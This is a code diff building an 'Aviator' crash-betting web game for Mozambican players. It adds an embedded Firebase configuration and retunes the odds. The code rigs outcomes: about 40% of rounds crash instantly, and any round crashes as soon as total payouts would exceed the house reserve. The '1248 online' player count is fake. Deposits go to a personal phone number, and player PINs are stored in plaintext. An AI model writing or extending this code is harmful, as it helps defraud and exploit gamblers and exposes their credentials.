@@ -1,9 +1,89 @@
+<!DOCTYPE html>
+<html lang="pt-pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aviator Probetgames - Admin Edition</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #0b0b0b; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
+        .hidden { display: none !important; }
+        .multiplier-text { font-size: 5rem; font-weight: 900; transition: all 0.1s; color: white; }
+        .multiplier-crash { color: #dc3545 !important; }
+        .btn-apostar { background-color: #28a745; color: white; }
+        .btn-espera { background-color: #1a5e2b; color: #ccc; cursor: not-allowed; }
+        .btn-sacar { background-color: #d9a406; color: black; font-weight: 900; }
+        .btn-ganhou { background-color: #007bff; color: white; }
+        .btn-perdeu { background-color: #dc3545; color: white; }
+        .history-bar { display: flex; gap: 8px; overflow-x: auto; padding: 10px; scrollbar-width: none; min-height: 45px; }
+        .history-item { padding: 4px 12px; border-radius: 20px; font-weight: bold; font-size: 12px; flex-shrink: 0; }
+        .progress-container { width: 100%; background: #222; height: 4px; border-radius: 2px; margin-top: 10px; }
+        #progress-bar { width: 0%; height: 100%; background: #d9a406; transition: width 0.1s linear; }
+    </style>
+</head>
+<body>
+
+<div id="auth-screen" class="fixed inset-0 bg-black z-50 flex flex-col items-center justify-center p-6">
+    <h1 class="text-red-600 text-3xl font-black mb-8 select-none">AVIADOR PROBETGAMES</h1>
+    <div class="w-full max-w-sm bg-gray-900 p-6 rounded-3xl border border-gray-800">
+        <input type="text" id="phone" placeholder="Contacto (+258...)" class="w-full p-4 mb-3 bg-black border border-gray-700 rounded-xl text-white">
+        <input type="password" id="pin" placeholder="PIN de 6 dígitos" class="w-full p-4 mb-6 bg-black border border-gray-700 rounded-xl text-white">
+        <button onclick="userAction.login()" class="w-full bg-green-600 py-4 rounded-xl font-bold mb-3">ENTRAR</button>
+        <button onclick="userAction.register()" class="w-full bg-gray-800 py-4 rounded-xl font-bold">CRIAR CONTA</button>
+    </div>
+</div>
+
+<div id="game-screen" class="p-4 hidden">
+    <div class="flex justify-between items-start mb-4">
+        <div>
+            <p id="player-id" class="text-gray-500 text-xs uppercase font-bold">---</p>
+            <p class="text-green-500 text-[10px] font-bold">● <span id="online-count">1248</span> ONLINE</p>
+        </div>
+        <div class="text-right">
+            <div class="text-yellow-500 font-black text-2xl leading-tight"><span id="saldo-real">0.00</span> <span class="text-xs">MTN</span></div>
+            <div class="flex gap-2 justify-end mt-2">
+                <button onclick="uiAction.deposit()" class="bg-green-600 px-3 py-1 rounded-full text-[10px] font-black uppercase">DEPOSITAR</button>
+                <button onclick="uiAction.withdraw()" class="bg-blue-600 px-3 py-1 rounded-full text-[10px] font-black uppercase">LEVANTAR</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="history" class="history-bar mb-2 bg-black/50 rounded-xl border border-gray-900"></div>
+
+    <div class="bg-black aspect-video rounded-[2rem] flex flex-col items-center justify-center border-2 border-gray-800 relative mb-4 overflow-hidden">
+        <div id="mult-display" class="multiplier-text">1.00x</div>
+        <div id="game-info" class="text-gray-500 font-bold uppercase tracking-widest text-xs mt-2">Aguardando...</div>
+        <div class="w-48 progress-container hidden" id="waiting-timer">
+            <div id="progress-bar"></div>
+        </div>
+    </div>
+
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div class="bg-gray-900 p-4 rounded-3xl border border-gray-800">
+            <input type="number" id="bet-val-1" value="10" class="w-full bg-black text-center p-2 rounded-lg mb-2 text-white font-bold border border-gray-700">
+            <button id="btn-bet-1" onclick="gameEngine.placeBet(1)" class="w-full py-5 rounded-2xl btn-apostar font-black text-lg uppercase transition-all">Apostar</button>
+            <div id="cashout-val-1" class="text-center text-[10px] mt-2 text-gray-500 font-bold">GANHOS: 0.00</div>
+        </div>
+        <div class="bg-gray-900 p-4 rounded-3xl border border-gray-800">
+            <input type="number" id="bet-val-2" value="10" class="w-full bg-black text-center p-2 rounded-lg mb-2 text-white font-bold border border-gray-700">
+            <button id="btn-bet-2" onclick="gameEngine.placeBet(2)" class="w-full py-5 rounded-2xl btn-apostar font-black text-lg uppercase transition-all">Apostar</button>
+            <div id="cashout-val-2" class="text-center text-[10px] mt-2 text-gray-500 font-bold">GANHOS: 0.00</div>
+        </div>
+    </div>
+</div>
+
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getDatabase, ref, set, update, onValue, get, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
     const firebaseConfig = {
-        // ... seus dados de configuração do Firebase (mantenha os mesmos)
+        apiKey: "AIzaSyBtEE6FKPFH9Bv2DhZNlb865iVsaX_2kpw",
+        authDomain: "casa-de-jogos-ed385.firebaseapp.com",
+        databaseURL: "https://casa-de-jogos-ed385-default-rtdb.firebaseio.com",
+        projectId: "casa-de-jogos-ed385",
+        storageBucket: "casa-de-jogos-ed385.firebasestorage.app",
+        messagingSenderId: "400751100510",
+        appId: "1:400751100510:web:e195695191607d02e46acf"
     };
 
     const app = initializeApp(firebaseConfig);
@@ -39,9 +119,9 @@
             const pin = document.getElementById('pin').value;
             if(!phone || pin.length < 4) return alert("Preencha todos os campos corretamente.");
             
-            // ALTERAÇÃO: Bônus reduzido para 5 MTN
+            // REDUZIDO PARA 5 MTN
             await set(ref(db, 'User/' + phone), { Contacto: phone, PIN: pin, Saldo: 5, Bonus: 0 });
-            alert("Conta criada! Você recebeu um bônus de 5 MTN.");
+            alert("Conta criada com sucesso! Ganhou 5 MTN de bônus.");
         }
     };
 
@@ -61,8 +141,7 @@
         deposit: () => {
             const msg = "DEPÓSITO\n\n1. Envie o valor para o número: 860407269\n2. Envie o comprovativo via WhatsApp.";
             if(confirm(msg)) {
-                const link = `https://wa.me/258860407269?text=Olá, enviei um depósito para a conta: ${userData.Contacto}`;
-                window.open(link, '_blank');
+                window.open(`https://wa.me/258860407269?text=Depósito: ${userData.Contacto}`, '_blank');
             }
         },
         withdraw: async () => {
@@ -78,13 +157,11 @@
                     status: "Pendente"
                 });
                 alert("Pedido de levantamento enviado!");
-            } else { alert("Valor inválido ou saldo insuficiente."); }
+            } else { alert("Saldo insuficiente ou valor abaixo do mínimo."); }
         },
         updateHistory: (odd) => {
             const container = document.getElementById('history');
-            let color = "bg-red-600";
-            if(odd >= 2) color = "bg-blue-600";
-            if(odd >= 10) color = "bg-purple-600";
+            let color = odd < 2 ? "bg-red-600" : (odd < 10 ? "bg-blue-600" : "bg-purple-600");
             const item = `<span class="history-item ${color}">${odd.toFixed(2)}x</span>`;
             container.innerHTML = item + container.innerHTML;
         }
@@ -126,15 +203,15 @@
             });
 
             flightInterval = setInterval(() => {
-                currentMult += 0.01 + (currentMult * 0.004); // Vôo ligeiramente mais rápido
+                currentMult += 0.01 + (currentMult * 0.005); // Voo um pouco mais rápido para aumentar tensão
                 document.getElementById('mult-display').innerText = currentMult.toFixed(2) + "x";
 
-                // Proteção do Cofre
                 let riscoTotal = 0;
                 [1, 2].forEach(id => {
                     if(bets[id].active) riscoTotal += (bets[id].amount * currentMult);
                 });
 
+                // Se o prêmio total a pagar exceder o cofre, explode na hora
                 if(riscoTotal > cofreDisponivel || currentMult >= crashPoint) {
                     window.gameEngine.crash(currentMult);
                 }
@@ -163,6 +240,7 @@
                     if(!bets[id].waiting) {
                         document.getElementById(`btn-bet-${id}`).innerText = "Apostar";
                         document.getElementById(`btn-bet-${id}`).className = "w-full py-5 rounded-2xl btn-apostar font-black text-lg uppercase";
+                        document.getElementById(`cashout-val-${id}`).innerText = "GANHOS: 0.00";
                     }
                 }, 2000);
             });
@@ -196,11 +274,12 @@
         },
         calcOdds: () => {
             const r = Math.random() * 100;
-            // NOVA LÓGICA DE PROBABILIDADE:
-            if(r < 35) return 1.00;             // 35% de chance de quebrar instantaneamente
-            if(r < 85) return (Math.random() * 0.8 + 1.1); // 50% de chance de quebrar entre 1.1x e 1.9x
-            if(r < 97) return (Math.random() * 2 + 2);     // 12% de chance de chegar entre 2x e 4x
-            return (Math.random() * 5 + 5);     // Apenas 3% de chance de passar de 5x
+            // DIFICULDADE AUMENTADA:
+            if(r < 40) return 1.00;             // 40% de chance de Crash Instantâneo
+            if(r < 90) return (Math.random() * 0.7 + 1.1); // 50% de chance de Crash baixo (até 1.8x)
+            return (Math.random() * 3 + 2);     // Apenas 10% de chance de passar de 2x
         }
     };
 </script>
+</body>
+</html>
